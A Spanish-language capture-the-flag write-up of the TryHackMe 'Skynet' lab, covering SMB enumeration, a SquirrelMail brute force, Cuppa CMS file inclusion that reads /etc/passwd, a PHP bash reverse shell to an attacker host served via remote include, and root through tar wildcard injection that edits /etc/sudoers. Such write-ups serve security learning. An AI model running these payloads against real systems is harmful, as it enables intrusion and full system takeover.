# Skynet — CTF Writeup

![Skynet](https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse4.explicit.bing.net%2Fth%2Fid%2FOIP.MqH5PylIBtfUMMuwiH03GQHaC9%3Fr%3D0%26pid%3DApi&f=1&ipt=7480acd686ae22f3262be270e367650fd83f8ec8c7acb2f815bdc84ef7abf8a9&ipo=images)

| | |
|---|---|
| **Plataforma** | TryHackMe |
| **Máquina** | Skynet |
| **Dificultad** | Fácil |
| **SO** | Linux |
| **Temática** | Terminator |

Máquina Linux vulnerable con temática de Terminator. El objetivo es escalar desde un reconocimiento inicial hasta obtener acceso root, pasando por SMB, SquirrelMail, un CMS vulnerable a RFI y una escalada de privilegios vía `tar` wildcard injection.

---

## Tabla de contenidos

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web y SMB](#2-enumeración-web-y-smb)
3. [Fuerza bruta al login de SquirrelMail con Burp Suite](#3-fuerza-bruta-al-login-de-squirrelmail-con-burp-suite)
4. [Acceso al correo y nueva credencial SMB](#4-acceso-al-correo-y-nueva-credencial-smb)
5. [Descubrimiento del CMS oculto](#5-descubrimiento-del-cms-oculto)
6. [Explotación de Cuppa CMS (RFI)](#6-explotación-de-cuppa-cms-rfi)
7. [Shell reversa y flag de usuario](#7-shell-reversa-y-flag-de-usuario)
8. [Escalada de privilegios (tar wildcard injection)](#8-escalada-de-privilegios-tar-wildcard-injection)
9. [Resumen de flags](#9-resumen-de-flags)

---

## 1. Reconocimiento

Arrancamos con un escaneo de puertos y servicios usando Nmap, incluyendo scripts de detección de vulnerabilidades:

```bash
nmap -sV -sC --script vuln <IP_OBJETIVO>
```

![Port scanning the network](https://www.jalblas.com/wp-content/uploads/2024/11/Port-scanning-the-network.png.webp)

El escaneo muestra varios servicios interesantes:

- **22/tcp** — SSH (OpenSSH 7.2p2)
- **80/tcp** — Apache 2.4.18, con `http-enum` detectando `/squirrelmail`
- **110/tcp** y **143/tcp** — Dovecot (POP3 / IMAP)
- **139/tcp** y **445/tcp** — Samba (SMB)

El puerto 80 es el punto de partida más obvio, así que lo visitamos en el navegador.

![The Skynet search page](https://www.jalblas.com/wp-content/uploads/2024/11/The-Skynet-search-page.png.webp)

Es una especie de buscador estilo Google que no hace nada funcional por ahora. Queda pendiente para más adelante.

---

## 2. Enumeración web y SMB

### Directorios web con Gobuster

```bash
gobuster dir --url http://<IP_OBJETIVO> --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Using gobuster](https://www.jalblas.com/wp-content/uploads/2024/11/Using-gobuster.png.webp)

Aparecen varios directorios: `/admin`, `/config`, `/ai`, `/squirrelmail`, entre otros. La mayoría devuelven 301 y no dan acceso directo, salvo `/squirrelmail`.

![Squirrelmail webmail](https://www.jalblas.com/wp-content/uploads/2024/11/Squirrelmail-webmail.png.webp)

Un webmail (SquirrelMail v1.4.23) al que todavía no tenemos credenciales.

### Enumeración de recursos compartidos SMB

```bash
nmap -sS --script smb-enum-shares.nse -p 139,445 <IP_OBJETIVO>
```

![SMB scan results](https://www.jalblas.com/wp-content/uploads/2024/11/SMB-scan-results.png.webp)

- `-sS` → escaneo SYN (más sigiloso y rápido)
- `--script smb-enum-shares.nse` → enumera los recursos compartidos SMB
- `-p 139,445` → puertos típicos de NetBIOS/SMB

Se detectan 4 recursos compartidos, dos de ellos con acceso anónimo (invitado): `anonymous` e `IPC$`.

Nos conectamos para listar los shares disponibles:

```bash
smbclient -L <IP_OBJETIVO>
```

![Accessing the SMB through smbclient](https://www.jalblas.com/wp-content/uploads/2024/11/Accessing-the-SMB-through-smbclient.png.webp)

Aquí aparece un dato clave: el share `milesdyson`, lo que nos da un posible **nombre de usuario** del sistema: `milesdyson`.

Entramos al share anónimo:

```bash
smbclient //<IP_OBJETIVO>/anonymous -U guest
```

![Logging into SMB and finding files](https://www.jalblas.com/wp-content/uploads/2024/11/Logging-into-SMB-and-finding-files.png.webp)

Descargamos y leemos `attention.txt`:

```bash
get attention.txt
cat attention.txt
```

> **Ejemplo:** contenido de `attention.txt`.

> *"A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this. — Miles Dyson"*

Dentro del share también hay una carpeta `logs` con tres archivos (`log1.txt`, `log2.txt`, `log3.txt`). Solo `log1.txt` tiene contenido.

> **Ejemplo:** contenido de `log1.txt` con las posibles contraseñas.

Es una lista de posibles contraseñas con temática Terminator. Probamos primero con Hydra contra el servicio SMB (`hydra -l milesdyson -P log1.txt <IP> smb`), pero no funciona. El siguiente paso lógico es intentar esa lista contra el **login de SquirrelMail**.

---

## 3. Fuerza bruta al login de SquirrelMail con Burp Suite

Abrimos Burp Suite, activamos el intercept y enviamos el formulario de login de SquirrelMail para capturar la petición POST.

> **Ejemplo:** petición POST capturada por Burp Suite.

La petición va a `/squirrelmail/src/redirect.php` con los parámetros `login_username` y `secretkey`.

Enviamos la petición a **Intruder**.

> **Ejemplo:** petición enviada desde Burp Suite a Intruder.

Marcamos el parámetro `secretkey` como posición de carga útil.

> **Ejemplo:** parámetro `secretkey` marcado como payload.

En la pestaña **Payloads**, seleccionamos tipo *Simple list* y cargamos el archivo `log1.txt`.

> **Ejemplo:** configuración de la lista de payloads.

Lanzamos el ataque (*Start attack*).

> **Ejemplo:** resultados de Intruder mostrando una respuesta diferente para la contraseña válida.

Todas las respuestas devuelven código **200** excepto una, que devuelve **302** (redirección, indicando login correcto) con una longitud de respuesta distinta: `cyborg007haloterminator`.

> **Contraseña del correo de Miles Dyson:** `cyborg007haloterminator`

---

## 4. Acceso al correo y nueva credencial SMB

Iniciamos sesión en SquirrelMail con `milesdyson` / `cyborg007haloterminator`.

> **Ejemplo:** bandeja de entrada de SquirrelMail.

Hay tres correos. Dos contienen texto sin mucha utilidad, pero el tercero, **"Samba Password reset"**, es justo lo que buscábamos.

> **Ejemplo:** correo de restablecimiento de contraseña de Samba.

> **Nueva contraseña SMB:** `)s{A&2Z=F^n_E.B\``

Como la contraseña tiene muchos caracteres especiales, en vez de pasarla directo por línea de comandos creamos un archivo de credenciales:

```bash
cat auth.txt
# username=milesdyson
# password=)s{A&2Z=F^n_E.B`

smbclient //<IP_OBJETIVO>/milesdyson -A auth.txt --v
```

> **Ejemplo:** acceso exitoso al share privado usando `auth.txt`.

¡Acceso concedido al share privado de Miles Dyson!

```bash
ls
```

> **Ejemplo:** listado del contenido del share `milesdyson`.

Encontramos varios PDFs sobre Machine Learning y una carpeta `notes`.

---

## 5. Descubrimiento del CMS oculto

Entramos a la carpeta `notes`:

```bash
cd notes
ls
```

> **Ejemplo:** listado de los archivos de la carpeta `notes`.

Muchos archivos `.md` sobre Machine Learning, pero destaca un `important.txt`:

```bash
get important.txt
cat important.txt
```

> **Ejemplo:** contenido de `important.txt` mostrando la ruta del CMS beta.

El archivo contiene una lista de tareas pendientes de Miles Dyson, y una de ellas revela una ruta oculta:

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 processors
3. Spend more time with my wife

> **Directorio oculto encontrado:** `/45kra24zxs28v3yd`

Visitamos esa ruta en el navegador.

![Visiting beta CMS](https://www.jalblas.com/wp-content/uploads/2024/11/Visiting-beta-CMS.png.webp)

---

## 6. Explotación de Cuppa CMS (RFI)

Enumeramos de nuevo con Gobuster, esta vez apuntando al directorio recién descubierto:

```bash
gobuster dir --url http://<IP_OBJETIVO>/45kra24zxs28v3yd/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> **Ejemplo:** Gobuster encontrando `/administrator`.

Aparece `/administrator`, que resulta ser el panel de login de **Cuppa CMS**.

![Cuppa CMS Administrator login](https://www.jalblas.com/wp-content/uploads/2024/11/Cuppa-CMS-Administrator-login.png.webp)

Buscamos exploits conocidos para este CMS:

```bash
searchsploit cuppa
```

> **Ejemplo:** resultado de `searchsploit` para Cuppa CMS.

Aparece un exploit de **Local/Remote File Inclusion** en `alertConfigField.php` ([Exploit-DB](https://www.exploit-db.com/exploits/25971)). Esto encaja con lo que ya intuíamos.

### Confirmando el RFI/LFI

Probamos leyendo `/etc/passwd` directamente desde la URL vulnerable:

```text
http://<IP_OBJETIVO>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```

> **Ejemplo:** respuesta mostrando el contenido de `/etc/passwd` mediante la vulnerabilidad.

Confirmado: podemos incluir archivos arbitrarios del sistema. El mismo resultado se puede obtener con `curl`:

```bash
curl -s --data-urlencode urlConfig=../../../../../../../../../etc/passwd \
  "http://<IP_OBJETIVO>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php"
```

No es posible leer `/etc/shadow` de esta forma, así que el siguiente paso es escalar de LFI a **RCE** incluyendo un archivo remoto malicioso (RFI real).

---

## 7. Shell reversa y flag de usuario

### Paso 1 — Crear la shell reversa en PHP

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1'");?>
```

Guardamos el código como `shell.php` (payload obtenido de [Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet)).

### Paso 2 — Servir el archivo con un servidor web simple

```bash
python -m http.server
```

> **Ejemplo:** terminal mostrando `python -m http.server` sirviendo `shell.php`.

### Paso 3 — Poner en escucha un listener con Netcat

```bash
nc -lvnp 443
```

### Paso 4 — Disparar el RFI para incluir la shell remota

```text
http://<IP_OBJETIVO>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<IP_ATACANTE>:8000/shell.php
```

> **Ejemplo:** listener de Netcat mostrando la conexión recibida como `www-data`.

¡Acceso conseguido como `www-data`!

### Obteniendo la flag de usuario

```bash
cd /home/milesdyson
cat user.txt
```

> **Ejemplo:** terminal mostrando la user flag.

> **User flag:** `7ce5c2109a40f958099283600a9ae807`

---

## 8. Escalada de privilegios (tar wildcard injection)

Tenemos una shell no interactiva, así que la mejoramos primero:

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
# Ctrl+Z para pausar el proceso
stty raw -echo
fg
```

Revisando el directorio home de `milesdyson` aparece un script interesante: `backup.sh`, dentro de la carpeta `backups`. Comprobamos si algún cronjob lo ejecuta:

```bash
cat /etc/crontab
```

> **Ejemplo:** contenido de `/etc/crontab` mostrando la ejecución periódica de `backup.sh` como root.

El cronjob `*/1 * * * * root /home/milesdyson/backups/backup.sh` se ejecuta **cada minuto como root**, y hace un `tar` sobre el contenido de `/var/www/html`.

Esto es explotable mediante **wildcard injection en `tar`** ([GTFOBins - tar](https://gtfobins.github.io/gtfobins/tar/)): si el comando `tar` se ejecuta con un comodín (`*`) dentro de un directorio donde nosotros podemos escribir, podemos crear archivos con nombres que `tar` interpreta como flags (`--checkpoint`, `--checkpoint-action`) para ejecutar comandos arbitrarios como root.

```bash
cd /var/www/html
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
touch "/var/www/html/--checkpoint=1"
```

Cuando el cron ejecuta `backup.sh` (que hace `tar` sobre ese directorio), `tar` interpreta esos nombres de archivo como opciones y ejecuta `sudo.sh` como root, añadiéndonos una entrada `NOPASSWD` en `/etc/sudoers`.

Tras esperar al siguiente minuto:

```bash
sudo su
```

> **Ejemplo:** terminal mostrando la escalada de privilegios hasta `root`.

¡Somos root!

### Obteniendo la flag de root

```bash
cd /root
cat root.txt
```

> **Ejemplo:** terminal mostrando la root flag.

> **Root flag:** `3f0372db24753accc7179a282cd6a949`

---

## 9. Resumen de flags

| Pregunta | Respuesta |
|---|---|
| Contraseña de correo de Miles Dyson | `cyborg007haloterminator` |
| Directorio oculto del CMS beta | `45kra24zxs28v3yd` |
| Vulnerabilidad que permite incluir un archivo remoto | RFI |
| User flag | `7ce5c2109a40f958099283600a9ae807` |
| Root flag | `3f0372db24753accc7179a282cd6a949` |

---

## 10. Lecciones aprendidas

- Enumerar servicios antes de explotar nada.
- No ignorar SMB: los shares anónimos pueden filtrar información útil.
- Las credenciales reutilizadas o expuestas pueden abrir nuevos vectores de ataque.
- Un CMS vulnerable puede convertir una simple inclusión de archivos en ejecución remota de comandos.
- Los cronjobs ejecutados como root deben revisarse cuidadosamente.
- Los comodines (`*`) en scripts con privilegios pueden introducir vulnerabilidades de escalada.

---

## Herramientas utilizadas

- Nmap
- Gobuster
- smbclient
- Hydra
- Burp Suite
- SearchSploit
- curl
- Python HTTP Server
- Netcat

> **Nota:** Esta documentación se realizó exclusivamente en un entorno de laboratorio autorizado de TryHackMe con fines educativos.
